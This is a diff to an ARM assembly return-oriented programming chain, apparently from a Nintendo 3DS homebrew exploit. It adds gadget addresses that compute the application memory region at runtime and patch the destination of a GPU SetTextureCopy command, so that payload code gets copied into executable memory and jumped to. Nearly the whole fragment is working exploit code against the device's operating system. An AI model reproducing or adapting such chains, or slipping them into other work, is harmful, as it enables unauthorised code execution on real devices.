@@ -51,6 +51,15 @@ secondaryROP:
 			.word 0xDEADC0DE ; r5 (garbage)
 			.word 0xDEADC0DE ; r6 (garbage)
 
+	;fix GX command address
+		.word 0x002d2b18 ; pop	{r0, pc}
+			.word 0x1FF80040 ; APPMEMALLOC
+		.word 0x00272738 ; ldr r0, [r0] | pop {r4, pc}
+			.word CN_GSPHEAP+CN_TEXTPA_OFFSET_FROMEND+CN_INITIALCODE_OFFSET ; r4 (offset to dst from end of APPKICATION mem region)
+		.word 0x001e5ab0 ; add r0, r0, r4 | pop {r4, pc}
+			.word CN_HEAPPAYLOADADR+gxCommand+8-ROP ; r4 (location of dst field in GX command struct)
+		.word 0x0020096c ; ldr r0, [r4] | pop {r4, pc}
+
 	;send GX command
 		.word 0x002d2b18 ; pop	{r0, pc}
 			.word CN_GSPSHAREDBUF_ADR ; r0
@@ -62,7 +71,6 @@ secondaryROP:
 			.word 0xDEADC0DE ; r6 (garbage)
 			.word 0xDEADC0DE ; r7 (garbage)
 			.word 0xDEADC0DE ; r8 (garbage)
-
 
 	;sleep for a second and jump to code
 		.word 0x001742ec ; pop {r3, pc}
@@ -86,10 +94,10 @@ endROP:
 
 .align 4
 gxCommand:
-	.word 0x00000004 ;command header (SetTextureCopy)
-	.word CN_CODELOCATIONGSP ;source address
-	.word CN_GSPHEAP+CN_TEXTPAOFFSET+CN_INITIALCODE_OFFSET ;destination address (put it at the end to avoid cache issues)
-	.word 0x00010000 ;size
+	.word 0x00000004 ; command header (SetTextureCopy)
+	.word CN_CODELOCATIONGSP ; source address
+	.word 0xDEADC0DE ; destination address (overwritten by ROP)
+	.word 0x00010000 ; size
 	.word 0xFFFFFFFF ; dim in
 	.word 0xFFFFFFFF ; dim out
 	.word 0x00000008 ; flags
